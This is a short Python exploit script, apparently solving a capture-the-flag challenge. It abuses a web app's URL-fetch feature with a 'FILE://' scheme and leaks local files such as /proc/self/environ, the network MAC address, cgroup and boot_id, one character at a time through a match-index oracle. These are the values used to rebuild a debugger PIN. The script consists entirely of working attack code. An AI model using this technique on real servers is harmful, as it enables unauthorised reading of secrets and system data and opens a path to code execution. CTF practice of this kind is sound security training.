import requests
import string

# word = string.digits + '-' + string.ascii_lowercase 
word = ':' + string.digits + string.ascii_lowercase 

url = 'https://blackhat4-c0e5b86386483f1ae2059909d76cd00c-0.chals.bh.ctf.sa'
# /proc/self/environ
file = '/proc/self/environ' # username
# file = '/sys/class/net/eth0/address' # 02:42:0a:01:ef:91
# file = '/proc/self/cgroup' # 05acfab659386a695d98c1f80a2ceb5cf0f97d5c14cae9ed69b3d84c98c4814b
# file = '/proc/sys/kernel/random/boot_id' # 4b5e71a5-18d4-4b52-aacb-2a6b6fbcb09a

# output = ''
# output = 'docker/'
# output = '02:42:0'
output = 'U'
for _ in range(16):
	for i in word:
		temp = output
		temp += str(i)
		data = {
			'url' : 'FILE://' + file,
			'success' : 'Response',
			'data' : str(temp),
			'method':'GET',
			'redirects' : 'No'
		}

		requests.post(url,data=data)

		res = requests.get(url+'/website?id=0')

		# if 'Match found at index 0' in res.text:
		# if 'Match found at index 12' in res.text:
		if 'Match found at index 0' in res.text:
			output += str(i)
			print (output)
			requests.post(url+'/delete?id=0')
			break
		else:
			requests.post(url+'/delete?id=0')

# Match found at index 12
# data = {
# 	'url' : 'FILE://' + file,
# 	'success' : 'Response',
# 	'data' : str(output),
# 	'method':'GET',
# 	'redirects' : 'No'
# }

# requests.post(url,data=data)

# res = requests.get(url+'/website?id=0')
# print(res.text)
# requests.post(url+'/delete?id=0')